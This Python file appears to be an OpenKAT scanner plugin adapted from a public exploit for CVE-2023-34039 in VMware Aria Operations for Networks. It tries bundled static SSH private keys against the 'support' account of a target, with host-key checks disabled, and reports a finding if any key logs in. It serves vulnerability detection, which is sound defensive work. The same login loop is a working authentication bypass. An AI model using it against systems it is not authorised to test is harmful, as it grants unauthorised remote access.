"""
From:

https://github.com/sinsinology/CVE-2023-34039/blob/main/CVE-2023-34039.py

VMWare Aria Operations for Networks (vRealize Network Insight) Static SSH key RCE (CVE-2023-34039)
Version: All versions from 6.0 to 6.10
Discovered by: Harsh Jaiswal (@rootxharsh) and Rahul Maini (@iamnoooob) at ProjectDiscovery Research
Exploit By: Sina Kheirkhah (@SinSinology) of Summoning Team (@SummoningTeam)
A root cause analysis of the vulnerability can be found on my blog:
https://summoning.team/blog/vmware-vrealize-network-insight-ssh-key-rce-cve-2023-34039/

(*) Exploit by Sina Kheirkhah (@SinSinology) of Summoning Team (@SummoningTeam)

"""

import subprocess
import tempfile
from pathlib import Path

# Resolve the keys relative to this module. os.walk("keys") used the process
# CWD (/app/boefje in the OCI image) instead, so it walked a non-existent
# directory, silently found no keys and always reported "not vulnerable".
KEYS_DIR = Path(__file__).parent / "keys"


def run(boefje_meta: dict) -> list[tuple[set, str | bytes]]:
    input_ = boefje_meta["arguments"]["input"]  # input is IPService
    ip_port = input_["ip_port"]
    if input_["service"]["name"] != "ssh":
        return [({"openkat/deschedule"}, "Skipping because service is not an ssh service")]

    ip = ip_port["address"]["address"]
    port = ip_port["port"]

    for key_file in sorted(p for p in KEYS_DIR.rglob("*") if p.is_file()):
        # The keys are committed world-readable (mode 0755) and Docker COPY
        # preserves that mode; OpenSSH refuses a private key with group/world
        # permissions and exits 255, so every key was skipped. Copy the key to a
        # private (0600) temp file — NamedTemporaryFile creates it with 0600 —
        # so ssh will actually use it.
        with tempfile.NamedTemporaryFile("wb") as tmp:
            tmp.write(key_file.read_bytes())
            tmp.flush()
            ssh_command = [
                "ssh",
                "-i",
                tmp.name,
                "support@" + ip,
                "-p",
                str(port),
                "-o",
                "StrictHostKeyChecking=no",
                "-o",
                "UserKnownHostsFile=/dev/null",
                "-o",
                "BatchMode=yes",
                "exit",
            ]
            try:
                result = subprocess.run(ssh_command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except Exception:  # noqa: S112
                continue

            coutput = result.returncode
            if coutput not in (0, 127):  # 0 = it worked, 127 = `exit` does not exist but we did connect
                continue

            key_id = key_file.relative_to(KEYS_DIR)
            return [
                (
                    set(),
                    "\n".join((str(coutput), f"{key_id} is allowed access to vRealize Network Insight on {ip}:{port}")),
                ),
                ({"openkat/finding"}, "CVE-2023-34039"),
            ]

    return [(set(), "No known keys allowed")]
